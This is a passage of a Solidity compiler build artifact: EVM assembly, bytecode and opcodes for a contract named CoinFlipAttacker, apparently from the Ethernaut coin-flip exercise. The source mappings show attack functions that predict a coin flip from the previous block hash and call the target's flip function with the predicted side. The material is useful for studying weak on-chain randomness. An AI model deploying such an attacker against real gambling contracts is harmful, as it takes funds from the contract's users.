dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n    tag_11:\n        /* \"contract/security/CoinFlipAttacker.sol\":2250:2259  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2271  getFlip() */\n      tag_28\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2269  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2271  getFlip() */\n      jump\t// in\n    tag_28:\n        /* \"contract/security/CoinFlipAttacker.sol\":2250:2271  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2294  cf_interface */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2299  cf_interface.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contract/security/CoinFlipAttacker.sol\":2300:2304  side */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2305  cf_interface.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":1696:1942  function getFlip() private returns (bool) {\r... */\n    tag_14:\n        /* \"contract/security/CoinFlipAttacker.sol\":1732:1736  bool */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1749:1767  uint256 blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1807  block.number.sub(1) */\n      tag_34\n        /* \"contract/security/CoinFlipAttacker.sol\":1805:1806  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1800  block.number */\n      number\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1804  block.number.sub */\n      tag_35\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1807  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_34:\n        /* \"contract/security/CoinFlipAttacker.sol\":1778:1808  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"contract/security/CoinFlipAttacker.sol\":1770:1809  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"contract/security/CoinFlipAttacker.sol\":1749:1809  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1820:1836  uint256 coinFlip */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1861  blockValue.div(FACTOR) */\n      tag_36\n        /* \"contract/security/CoinFlipAttacker.sol\":1854:1860  FACTOR */\n      sload(0x03)\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1849  blockValue */\n      dup4\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1853  blockValue.div */\n      tag_37\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1861  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_36:\n        /* \"contract/security/CoinFlipAttacker.sol\":1820:1861  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1872:1881  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1896:1897  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1892  coinFlip */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1897  coinFlip == 1 */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n      tag_38\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":1907:1912  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n      jump(tag_39)\n    tag_38:\n        /* \"contract/security/CoinFlipAttacker.sol\":1900:1904  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n    tag_39:\n        /* \"contract/security/CoinFlipAttacker.sol\":1872:1912  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1930:1934  side */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":1923:1934  return side */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1696:1942  function getFlip() private returns (bool) {\r... */\n      swap1\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_35:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1332:1339  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_41\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1362:1363  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1365:1366  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1361  sub */\n      tag_42\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n    tag_41:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1351:1401  return sub(a, b, \"SafeMath: subtraction overflow\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_37:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3091:3098  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      tag_44\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3121:3122  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3124:3125  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3120  div */\n      tag_45\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_44:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3110:3156  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_42:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1778:1785  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1810:1811  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1806  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1811  b <= a */\n      gt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1813:1825  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1797:1826  require(b <= a, errorMessage) */\n      swap1\n      tag_47\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_48:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_50\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_48)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_51\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_51:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_47:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1845  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1852:1853  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1849  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1853  a - b */\n      sub\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1853  uint256 c = a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1871:1872  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1864:1872  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_45:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3724:3731  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3821:3822  0 */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3818  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3822  b > 0 */\n      gt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3824:3836  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3809:3837  require(b > 0, errorMessage) */\n      swap1\n      tag_53\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_54:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_56\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_54)\n    tag_56:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_57\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_57:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_53:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3856  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3863:3864  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3860  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3864  a / b */\n      dup2\n      tag_58\n      jumpi\n      invalid\n    tag_58:\n      div\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3864  uint256 c = a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3968:3969  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3961:3969  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220472440feb7c915c1829ba2290c8732c55c57dc31af063220e0fedf42591026ca64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060035534801561003457600080fd5b5060405161073a38038061073a8339818101604052602081101561005757600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506106008061013a6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80631a13ff681461004657806383e0052514610050578063b6f02db91461005a575b600080fd5b61004e610064565b005b6100586101d7565b005b610062610299565b005b600061006e61035b565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16816040516024018082151581526020019150506040516020818303038152906040527f1d263f67000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016a5780518252602082019150602081019050602083039250610147565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101cc576040519150601f19603f3d011682016040523d82523d6000602084013e6101d1565b606091505b50505050565b60006101e161035b565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561025a57600080fd5b505af115801561026e573d6000803e3d6000fd5b505050506040513d602081101561028457600080fd5b81019080805190602001909291905050505050565b60006102a361035b565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561031c57600080fd5b505af1158015610330573d6000803e3d6000fd5b505050506040513d602081101561034657600080fd5b81019080805190602001909291905050505050565b6000806103726001436103b090919063ffffffff16565b4060001c9050600061038f600354836103fa90919063ffffffff16565b90506000600182146103a25760006103a5565b60015b905080935050505090565b60006103f283836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610444565b905092915050565b600061043c83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610504565b905092915050565b60008383111582906104f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156104b657808201518184015260208101905061049b565b50505050905090810190601f1680156104e35780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080831182906105b0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561057557808201518184015260208101905061055a565b50505050905090810190601f1680156105a25780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385816105bc57fe5b04905080915050939250505056fea2646970667358221220472440feb7c915c1829ba2290c8732c55c57dc31af063220e0fedf42591026ca64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x3 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x73A CODESIZE SUB DUP1 PUSH2 0x73A DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x600 DUP1 PUSH2 0x13A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1A13FF68 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x83E00525 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xB6F02DB9 EQ PUSH2 0x5A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x64 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x1D7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x62 PUSH2 0x299 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x6E PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x1D263F6700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x16A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x147 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1CC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E1 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x25A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x26E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A3 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x31C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x330 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x346 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD 